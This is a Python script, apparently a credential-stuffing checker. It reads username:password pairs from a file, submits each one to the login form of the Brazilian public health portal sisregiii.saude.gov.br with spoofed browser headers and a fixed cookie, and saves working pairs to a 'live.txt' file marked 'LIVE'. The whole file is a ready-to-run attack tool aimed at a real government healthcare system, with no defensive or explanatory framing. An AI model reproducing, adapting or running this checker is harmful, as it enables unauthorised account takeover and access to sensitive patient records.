import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style
import os

def a(x, y):
    try:
        response = requests.post(
            'https://sisregiii.saude.gov.br',
            data={
                'usuario': x,
                'senha': y,
                'senha_256': 'a76b7f25b6ba5ec51bd9fa42f4143b63c2495996e783baa4d9f8459d314f6ad2',
                'etapa': 'ACESSO',
                'logout': ''
            },
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Origin': 'https://sisregiii.saude.gov.br',
                'Referer': 'https://sisregiii.saude.gov.br/',
                'Cookie': 'TS019395b4=0140e3e4e55e786d7156b361f28eeee8527752955af357d353dd5fb2707db248c5b5788747db5487c6f437b0fb0c965c9ff0e9aeec'
            }
        )
        
        soup = BeautifulSoup(response.content, 'html.parser')
        c = soup.select_one('.mensagem font')

        if c:
            message = c.get_text(strip=True)
            if "login ou senha incorretos" in message.lower():
                output = f"{Fore.WHITE}❌ Login ou senha incorretos - {x}:{y}{Style.RESET_ALL}"
                print(output)
            else:
                output = f"{Fore.RED}❌ DIE - {x}:{y} - {Style.RESET_ALL}{message}"
                print(output)
        else:
            output = f"{Fore.GREEN}✅ LIVE - {x}:{y}{Style.RESET_ALL} @contracheque\n"
            print(output)
            with open('live.txt', 'a') as e:
            
                e.write(f"{Fore.GREEN}✅ LIVE - {x}:{y}{Style.RESET_ALL} @contracheque\n")

    except Exception as f:
        output = f"{Fore.YELLOW}⚠️ Erro ao verificar {x}:{y} - {str(f)}{Style.RESET_ALL}"
        print(output)

def g():
    if os.path.exists('live.txt'):
        os.remove('live.txt')
    
    try:
        with open('sis.txt', 'r') as h:
            i = h.readlines()
        
        for j in i:
            x, y = j.strip().split(':')
            if x and y:
                a(x, y)
                
    except FileNotFoundError:
        print(f"{Fore.RED}📄 Arquivo 'sis.txt' não encontrado!{Style.RESET_ALL}")
    except Exception as k:
        print(f"{Fore.RED}❗ Ocorreu um erro: {str(k)}{Style.RESET_ALL}")

if __name__ == "__main__":
    g()